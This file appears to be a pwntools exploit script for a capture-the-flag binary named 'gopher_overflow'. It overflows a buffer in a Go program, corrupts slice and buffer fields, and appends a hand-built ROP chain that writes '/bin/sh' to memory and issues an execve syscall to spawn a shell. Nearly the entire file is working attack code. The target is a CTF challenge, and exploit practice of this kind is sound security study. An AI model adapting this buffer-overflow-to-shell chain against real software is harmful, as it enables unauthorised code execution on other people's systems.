#!/bin/env python3
from pwn import *

bin = "gopher_overflow"

context.terminal = ["tmux", '-h', 'splitw']
context.binary = elf = ELF(bin)

slicebytetostring_val = 0x200
memmove_rcx_addr = 0xc0001a0fe0
bufIO_val = 0xc000108ed0 # 0xc000112000 # 0xeed0
'''
buff start  -> 0xc000112000
main.name() -> ret: 0xc000108ed0
main.main   -> ret: 0xc000108f38
'''
io = process(bin)
# io = remote("challenge.nahamcon.com", "30265")

io.clean()
offset = 40

payload  = b"A" * 32 
payload += p64(memmove_rcx_addr)
# payload += b"E" * (offset-(len(payload)))
payload += p64(slicebytetostring_val)
payload += b"B"*(8*2)
payload += b"A"*(8*2)
payload += b"C"*(8*2)
payload += b"D"*(8*2)
payload += b"X"*(8*2)
payload += b"Z"*(8*2)
payload += p64(bufIO_val)
payload += b"H"*(8*4)
payload += p64(0x200)
payload += b"K"*(8*3)
payload += b"L"*(8*3)
# payload += p64(0xdeadbeef)

from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 6ba226e66d873212b0ca3fbd1ad48558bb04bb8d0d42f8735167ebeed84c0a3d
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000c5bf) # 0x000000000040c5bf: pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
rop += b'/bin/sh\x00'
rop += rebase_0(0x0000000000015093) # 0x0000000000415093: pop rax; adc al, 0xf6; ret;
rop += rebase_0(0x000000000011e600)
rop += rebase_0(0x000000000002cb73) # 0x000000000042cb73: mov qword ptr [rax], rcx; ret;
rop += rebase_0(0x000000000000c5bf) # 0x000000000040c5bf: pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000015093) # 0x0000000000415093: pop rax; adc al, 0xf6; ret;
rop += rebase_0(0x000000000011e608)
rop += rebase_0(0x000000000002cb73) # 0x000000000042cb73: mov qword ptr [rax], rcx; ret;
# Filled registers: rdx, rax,
rop += rebase_0(0x000000000007a67a) # 0x000000000047a67a: pop rdx; ret;
rop += p(0)
# rop += rebase_0(0x000000000011e608)
# setup rdi
rop += p64(0x401209)    # pop rdi ; sete cl ; mov eax, ecx ; pop rbp ; ret
rop += p64(0x51e6f7)    # rdi = /bin/sh 
rop += p64(0xdeadbbeef) # for rbp
# setup rax
rop += rebase_0(0x0000000000004968) # 0x0000000000404968: pop rax; pop rbp; ret;
rop += p(0x000000000000003b)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000005e5e9) # 0x000000000045e5e9: syscall; ret;

payload += rop
payload += b"X" * 8
payload += b"G" * (512-(len(payload)))

print(f"payload length = {len(payload)}")

raw_input("")
'''
0x41c8a2 : pop rsi ; retf 0x4866
'''
io.sendline(payload)

io.interactive()